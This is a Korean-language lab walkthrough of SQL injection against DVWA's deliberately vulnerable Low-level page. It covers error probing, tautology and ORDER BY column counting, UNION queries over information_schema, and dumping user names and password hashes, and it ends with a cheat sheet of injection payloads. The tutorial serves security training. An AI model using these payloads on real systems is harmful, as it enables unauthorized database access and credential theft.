## SQL 삽입 공격
이 도구를 이용하여 허용받지 않은 서비스 대상으로 해킹을 시도하는 행위는 범죄 행위 입니다.     
해킹을 시도할 때에 발생하는 법적인 책임은 그것을 행한 사용자에게 있다는 것을 명심하시기 바랍니다.           
      
SQL Injection 취약점은 웹 애플리케이션의 메시지를 이용하여 데이터베이스 내부의 정보를 유출하는 취약점입니다.     
공격자는 데이터베이스 쿼리에 임의의 SQL 쿼리를 삽입함으로써 공격이 이루어 집니다.      

![image](https://github.com/user-attachments/assets/138182d9-75ee-4b59-b146-9244a625c355)
SQL Injection 취약점 진단의 화면 입니다. 아래 링크에서 SQL Injection 설명을 보시면 도움이 되실겁니다.

![image](https://github.com/user-attachments/assets/681c8fe7-8620-4d30-a74d-e7facddab60a)
SQL Injection에 웹 소스코드 입니다. GET 메소드로 입력한 id 값을 저장하는 것을 확인할 수 있습니다.

![image](https://github.com/user-attachments/assets/85fdebb2-775e-44f5-834b-765623895e8d)
Low레벨의 소스코드를 보시면 쿼리문에서 ID를 입력했을때 users 테이블에서 First name과 Surname을 검색하여 출력하는 단순한 구조로 되어 있습니다.     
여기서 문제점은 User ID를 검색하는 과정에서 입력 값 검증이 이루어 지지 않는다는 점입니다.     
"SELECT first_name, last_name FROM users WHERE user_id = '$id';";     

여기서 전체적으로 소스코드를 분석해보면 GET 메소드로 매개변수를 전달하며 ID와 Submit 2개의 매개변수가 존재하는 것을 파악할 수 있습니다.    

![image](https://github.com/user-attachments/assets/2347cafe-2b9a-48e3-b18a-3b28928a2528)            
      
User 테이블에서 User ID가 1인 first_name 필드와 last_name 필드를 출력합니다.     
User ID 값을 1씩 증가시켜 순차적으로 전체 테이블 내의 내용을 검색해 보시기 바랍니다.     
http://IP정보/vulnerabilities/sqli/?id=1&Submit=SubmitSQL Injection에는 다양한 공격 기법이 있지만 페이지에서 에러가 발생한다면      
Error-Based SQL Injection 과 UNION SQL Injection을 사용하는 것이 일반적입니다.      
그럼 매개변수에 특수문자를 삽입하여 SQL 에러가 발생하는지 확인을 해보도록 하겠습니다.        
일반적으로 특수문자는 싱글쿼터('), 더블쿼터("), 세미콜론(;) 등을 사용합니다.         

![image](https://github.com/user-attachments/assets/50395354-3675-4f5f-ae69-74ad6047e279)         
위에 화면은 에러를 발생시켰을때 화면 입니다.         
이와 같은 에러 정보는 데이터베이스마다 다르며 HTTP 응답 코드 또한 다를수 있습니다.           
500번 에러는 내부 서버 에러로 발생하는 경우가 일반적이며 200번 에러는 HTTP 요청을 성공했을때 발생을 합니다.     
프록시 툴을 통하여 HTTP 응답 헤더를 확인할수도 있습니다.        

![image](https://github.com/user-attachments/assets/ca955bf7-c39e-4ab5-9e8b-687af8e9aba8)

해당화면은 입력값에 비정상적인 쿼리 값을 입력했을때의 화면입니다.
' or 1=1 #을 입력하면 쿼리 결과가 항상 참이 되므로 테이블 내 전체 내용을 출력합니다.
#은 주석처리를 의미합니다.■ 테이블과 필드의 정의를 알아보도록 하겠습니다.
- information_schema.schemata : 데이터베이스와 관련된 정보를 가진 테이블
- - schema_name : 모든 데이터베이스의 이름 값을 가진 필드
  - - information_schema_tables : 테이블과 관련된 정보를 가진 테이블
    - - tables_name : 모든 테이블의 이름 값을 가진 필드
      - - information_schema.columns : 필드와 관련된 정보를 가진 테이블
        - - column_name : 모든 필드의 이름 값을 가진 필드■ Union 구문을 통한 DB 구조파악 순서
          - - order by를 통한 column 갯수 확인
            - - DB 버전 정보 확인- database 정보 확인
              - - table 정보 확인- column 정보 확인
                - - recode 정보 확인User
테이블 내용을 전부 출력했다면 이제 SQL Injection을 이용하여 총 필드개수를 파악해 보도록 하겠습니다.      
' order by 1 #http://IP정보/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit값을 바꿔가면서 에러가 언제 발생하는지 확인하시기 바랍니다.           
공격 대상의 SQL Injection 취약점을 확인했다면 가장 먼저 필드 개수 파악을 진행하는 것이 일반적인 방법 입니다.          
Order by 구문은 필드 값을 정렬할때 사용하며 여기에서는 전체 필드 개수를 파악하기 위함 입니다.다른 방법으로는 UNION을 사용하여 Null 값을 1씩 증가하게 하면서 필드 개수가 일치하는 지점까지 찾아볼 수도 있습니다.      
        
확인결과 해당 DB는 2개의 column을 가지고 있는것을 확인하였고, 공격 코드는 2개의 column을 포함하여 쿼리를 수행하도록 하겠습니다.     
' union select null, null #필드 값을 파악했으니 Union을 이용하여 데이터베이스와 버전 정보를 확인해 보도록 하겠습니다.     
![image](https://github.com/user-attachments/assets/706b7356-a293-4edb-a350-5c985024b044)
        
' and 1=1 union select database(), version() #' and 1=1 union select "text", @@version #User 정보 확인    
' union SELECT null, user() #Union select를 이용하여 중요 정보 및 파일을 출력할수 있다는것을 확인하였습니다.    

![image](https://github.com/user-attachments/assets/4e06a86e-7963-4063-afac-68fe8242a8ba)
table_schema 출력' and 1=1 union SELECT "text", table_schema FROM information_schema.tables #     

![image](https://github.com/user-attachments/assets/8061777a-097d-458a-b8bf-45a79682dd2c)
모든 DB의 테이블명 출력, 여기서 우리가 찾고자 하는것은 'dvwa'인 테이블명 입니다.'      
and 1=1 union SELECT table_schema, table_name FROM information_schema.tables #' and 1=1 union SELECT table_name, table_schema FROM information_schema.tables where table_schema='dvwa' #      

![image](https://github.com/user-attachments/assets/0cd8e358-48a4-44bc-b62c-7de6c22c7671)
users 테이블에 column명을 알아보았습니다.      
그중에 password 행을 확인하였습니다.' and =1=1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #    

![image](https://github.com/user-attachments/assets/0eeab25b-2b09-42a8-8395-72c3eab1f662)

아이디와 패스워드를 출력한 화면 입니다.     
' and 1=1 union SELECT first_name, password FROM dvwa.users #Medium 레벨, High레벨은 프록시 툴을 이용해 보시기 바랍니다.     
![image](https://github.com/user-attachments/assets/e6d331f2-3489-4e17-82bc-4e71c1bc5c6c)

공격 구문 정리
```
%' or '1' ='1%' order by 1 #
%' or 1=1 union select null, version() #
%' or 1=1 union select null, user() #
%' or 1=1 union select null, database() #
%' and 1=0 union select null, table_name from information_schema.tables #
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'users'#
%' and 1=0 union select null, concat(first_name, 0x0a, 0x0a, user, 0x0a, password) from users      
1' union select null, version() -- -
```

## More Information
https://www.securiteam.com/securityreviews/5DP0N1P76E.html
https://en.wikipedia.org/wiki/SQL_injection
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
https://owasp.org/www-community/attacks/SQL_Injection
https://bobby-tables.com/
